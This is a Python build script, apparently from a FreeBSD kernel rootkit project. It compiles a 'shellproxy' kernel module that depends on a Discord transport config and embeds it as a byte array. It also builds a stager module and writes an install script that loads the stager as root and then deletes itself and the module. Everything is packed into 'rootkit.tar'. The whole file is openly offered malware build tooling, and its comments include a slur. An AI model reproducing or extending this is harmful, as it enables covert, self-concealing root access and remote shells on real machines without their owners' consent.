"""
this is automagically ran on freebsd vm; see vmbuild.pl and makefile thx
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
"""
import glob
import os
import secrets
import subprocess
import sys


def run(*c, **x):
    print(" ".join(c))
    subprocess.run(c, check=True, **x)


def read(p):
    with open(p, "rb") as f:
        return f.read()


def write(p, d):
    with open(p, "wb") as f:
        f.write(d)

"""
this is the core building code. as you can tell its very badly written, and is mainly meant to just set up all the hot patching shit in the ehader files/config/etc.
you can edit this to add extra steps. think of this is a makefile/magefile but more retarded
"""
# per-build markers
magic = secrets.token_hex(8)
write("rand.h", f"""#define CN_END "__{magic}__"
#define RMAGIC "{magic}"
""".encode())
print(f"+ markers {magic}")

# config
run("cc", "-O2", "-o", "configgen", "configgen.c")
with open("config.h", "wb") as f:
    subprocess.run(["./configgen", "config.json"], stdout=f, check=True)

# 5. shellproxy module: embed the raw .ko.
if not os.path.exists("shellproxy/dd_conf.h"):
    sys.exit("dd_conf.h missing; full build needs the discord transport config")
for f in glob.glob("lib/*.o"):
    os.remove(f)
mkargs = ["make", "-C", "shellproxy"]
run(*mkargs, "clean")
run(*mkargs)

proxy = read("shellproxy/shellproxy.ko")
proxy_data = ",".join("0x%02x" % b for b in proxy)
write("proxy_blob.h", f"""static const unsigned char proxy_blob[] = {{{proxy_data}}};
static const unsigned int proxy_len = {len(proxy)};
""".encode())
print(f"+ shellproxy {len(proxy)} bytes embedded")

# 6. stager
run("make", "-C", "stager", "clean")
run("make", "-C", "stager")
write("stager.ko", read("stager/stager.ko"))

# 6. install and stubs
install_src = os.environ.get("INSTALL_SRC", "install")
if os.path.exists(install_src) and os.path.getsize(install_src) > 0:
    install = read(install_src)
else:
    install = read("src/tools/install") if os.path.exists("src/tools/install") else b"""#!/bin/sh
set -e
cd "$(dirname "$0")"
[ "$(id -u)" = "0" ] || { echo "root required" >&2; exit 1; }
kldload ./stager.ko
kldunload stager
rm -f stager.ko "$0"
"""
write("install", install)
os.chmod("install", 0o755)

# 7. tar
run("tar", "czf", "rootkit.tar", "install", "stager.ko")
size = os.path.getsize("rootkit.tar")
print(f"+ tarball {size} bytes")
